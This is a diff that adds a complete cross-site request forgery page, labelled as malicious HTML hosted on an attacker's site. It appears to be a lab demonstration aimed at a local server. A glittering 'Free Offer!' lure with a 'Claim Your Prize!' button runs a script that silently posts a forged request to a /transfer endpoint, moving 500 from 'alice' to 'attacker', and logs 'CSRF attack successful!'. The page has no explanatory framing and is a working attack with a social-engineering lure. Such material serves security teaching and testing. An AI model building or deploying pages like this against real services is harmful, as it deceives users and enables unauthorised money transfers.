@@ -1,0 +1,127 @@
+<!-- Malicious HTML hosted on an attacker's site -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Offer!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f8ff;
+      text-align: center;
+      padding: 50px;
+      color: #333;
+    }
+
+    h1 {
+      font-size: 3em;
+      color: #ffcc00;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+    }
+
+    p {
+      font-size: 1.5em;
+      color: #555;
+    }
+
+    .coin {
+      position: inline-block;
+      transform: translateX(-50%);
+      font-size: 3em;
+      animation: glitter 1s infinite;
+      z-index: 10;
+    }
+
+    .award {
+      display: inline-block;
+      background-color: #ffd700;
+      padding: 20px;
+      border-radius: 50%;
+      margin-top: 30px;
+      font-size: 2em;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .glitter {
+      animation: sparkle 1.5s infinite linear;
+      color: #ffcc00;
+      font-size: 2em;
+      text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8);
+    }
+
+    @keyframes glitter {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.2); opacity: 0.8; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes sparkle {
+      0% { text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8); }
+      50% { text-shadow: 0 0 30px rgba(255, 255, 0, 1), 0 0 50px rgba(255, 255, 0, 1); }
+      100% { text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8); }
+    }
+
+    .btn {
+      background-color: #ffcc00;
+      padding: 10px 20px;
+      font-size: 1.2em;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #ff9900;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎉 Welcome to the Free Offer! 🎉</h1>
+  <p>Enjoy your gift while staying on this page!</p>
+
+  <div class="coin">
+    💰💰💰
+  </div>
+
+  <div class="award">
+    🏆
+  </div>
+
+  <div class="glitter">
+    🌟🌟🌟
+  </div>
+
+  <button class="btn" onclick="startAttack()">Claim Your Prize!</button>
+
+  <script>
+    function startAttack() {
+      // Send the forged POST request without redirecting the user
+      fetch("http://localhost:3000/transfer", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: new URLSearchParams({
+          from: "alice",
+          to: "attacker",
+          amount: "500",
+        }),
+        mode:"no-cors"
+      })
+        .then((response) => response.text())
+        .then((data) => {
+          console.log("CSRF attack successful!", data);
+        })
+        .catch((error) => {
+          console.error("Error during CSRF attack:", error);
+        });
+    }
+  </script>
+
+</body>
+</html>
